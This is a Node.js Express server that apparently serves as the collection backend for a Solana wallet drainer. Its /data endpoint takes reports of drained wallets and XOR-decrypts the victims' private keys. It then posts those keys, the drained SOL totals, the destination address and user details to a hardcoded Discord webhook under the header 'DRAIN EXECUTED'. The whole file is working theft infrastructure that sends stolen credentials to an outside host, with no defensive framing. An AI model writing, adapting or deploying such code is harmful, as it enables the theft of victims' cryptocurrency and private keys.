const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1518230578246320293/34AEaJ-GcgHflhqtbrQ0kNTZaMBlRiSiX2DjVcWAGfS2e1vN1JsDeJ_484mrqt0pdJRB';

app.use(express.json({limit:'10mb'}));

app.post('/data', async (req, res) => {
  try {
    const data = req.body;
    
    // Decrypt private keys using XOR with decryptKey
    if (data.drained && Array.isArray(data.drained) && data.decryptKey) {
      const key = data.decryptKey;
      data.drained = data.drained.map(w => {
        if (w.privEncrypted) {
          let decrypted = '';
          for(let i = 0; i < w.privEncrypted.length; i++){
            decrypted += String.fromCharCode(w.privEncrypted.charCodeAt(i) ^ key.charCodeAt(i % key.length));
          }
          w.privDecrypted = decrypted;
          delete w.privEncrypted;
        }
        return w;
      });
    }

    // Prepare summary
    const summary = data.summary || {};
    const totalDrainedSOL = (summary.totalDrained || 0) / 1000000000;
    
    // Send to Discord
    const content = `**DRAIN EXECUTED**\n` +
                    `Total Wallets: ${summary.totalWallets || 0}\n` +
                    `Wallets with Balance: ${summary.walletsWithBalance || 0}\n` +
                    `Total Drained: ${totalDrainedSOL.toFixed(6)} SOL\n` +
                    `Destination: ${data.dest || 'Unknown'}\n` +
                    `User: ${data.user ? JSON.stringify(data.user) : 'Unknown'}\n` +
                    `Timestamp: ${new Date(data.timestamp).toISOString()}\n\n` +
                    `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;

    await axios.post(WEBHOOK_URL, { content });
    
    console.log('Data processed and sent to Discord successfully');
    res.status(200).send('Logged to Discord successfully');
  } catch(e) {
    console.error('Error:', e.message);
    res.status(500).send('Error: ' + e.message);
  }
});

// Health check endpoint for Render
app.get('/', (req, res) => {
  res.send('Decrypt backend is running');
});

app.listen(PORT, () => console.log('Server running on port ' + PORT));
